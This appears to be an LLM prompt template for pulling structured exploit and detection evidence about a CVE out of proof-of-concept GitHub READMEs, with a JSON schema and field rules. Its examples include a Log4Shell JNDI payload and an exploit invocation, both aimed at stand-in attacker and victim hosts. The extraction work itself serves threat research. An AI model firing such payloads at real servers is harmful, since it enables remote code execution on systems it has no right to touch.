You are a security engineer reviewing a Proof-of-Concept (PoC) GitHub repository README.
Your job is to extract ALL distinct evidence records that demonstrate how to reproduce,
exploit, or detect CVE {{cve_id}}.

This is a STRUCTURAL EXTRACTION task — you are finding and normalizing many pieces
of exploit/detection evidence. You are NOT classifying, scoring, or judging.

# OUTPUT JSON SCHEMA (required, no other keys)

{
  "cve_id": str,
  "evidence_records": [
    {
      "type": "network" | "poc_script" | "payload" | "scan_result" |
              "log_snippet" | "file_reference" | "config" | "documentation",
      "title": str | null,
      "request": str | null,
      "payload": str | null,
      "observable": list[str],
      "tool": str | null,
      "log_type": str | null,
      "source_section": str | null
    }
  ],
  "skipped_sections": list[str],
  "reason": str | null
}

# FIELD RULES

- "type": pick exactly one — see TYPE GUIDE below.
- "title": short human label (≤80 chars), e.g. "LDAP exploit via JNDI".
- "request": single curl / python / bash / yaml command line an operator types, e.g.
  "python3 poc.py --target https://victim --attacker ldap://x". Null when there is
  no runnable command (e.g. scanner output, raw payload).
- "payload": raw payload string the README quotes WITHOUT a wrapping command, e.g.
  "${jndi:ldap://attacker/Exploit}". Null if you already gave a "request".
- "observable": list of short strings copied verbatim from README that an operator
  would look for in logs/network captures. Examples:
    ["LDAP Server Start Listening...", "Received LDAP Query",
     "HTTP Request", "Response Code: 200", "Found CVE-2021-44228",
     "Found 9 vulnerable files"]. Empty list allowed but discouraged.
- "tool": name of any tool mentioned, e.g. "log4j2-scan", "nuclei", "curl", "ldap".
  Null if not a named tool.
- "log_type": one of "apache_access_log", "sysmon_event", "ldap_log", "http_log",
  "dns_log", "smb_log" — only set when "type" is "log_snippet" or "scan_result".
- "source_section": the README heading this record came from, e.g.
  "## Demo", "## Scan Output". Null if none.

# TYPE GUIDE (pick exactly one)

- "network":      HTTP request/response patterns, curl examples, LDAP/HTTP/SMB
                  traffic examples. The "request" field holds the curl line.
- "poc_script":   Python/Bash exploit scripts the operator runs. The "request"
                  field holds the invocation.
- "payload":      Raw payload string only — JNDI, SQLi, XSS, path traversal, etc.
                  Use "request"=null and "payload"=<payload>.
- "scan_result":  Tool output ("Found CVE-...", "Found 9 vulnerable files",
                  "X-Powered-By leaked", etc.). "tool" required.
- "log_snippet":  Verbatim log lines copied from a code fence.
                  "log_type" required.
- "file_reference": References to log/pcap/evtx files ("see app.log", "captured.pcap").
- "config":       Misconfiguration snippets (YAML/TOML/env) that demonstrate the
                  vulnerable default.
- "documentation": All other exploitation / reproduction prose that does not fit
                  the above. This is the catch-all — prefer the specific types
                  whenever possible.

# HARD RULES

1. Emit ONE JSON object with a LIST of records. Find ALL records, not just one.
   A typical README yields 3–15 records. Cap at 30.
2. NEVER fabricate. If a field is not present in the README, return null/[].
3. If the README has no exploitation evidence, return
   {"cve_id": "{{cve_id}}", "evidence_records": [], "reason": "no evidence found"}.
4. Do NOT include the same payload twice across records — consolidate into one.
5. "source_section" must be a real heading from the README, not invented.
6. "skipped_sections" lists README headings you considered but rejected (e.g.
   "License", "Contributing") — helps debug under-extraction.
7. Do NOT include any of these fields — we set them in code:
   - id, extraction_method, confidence, source, reference_url.

# ANTI-HALLUCINATION

- Keep records grounded in the README text. If unsure, drop the record.
- Prefer returning fewer, well-grounded records over many speculative ones.

Output exactly ONE JSON object — no prose, no markdown fence.
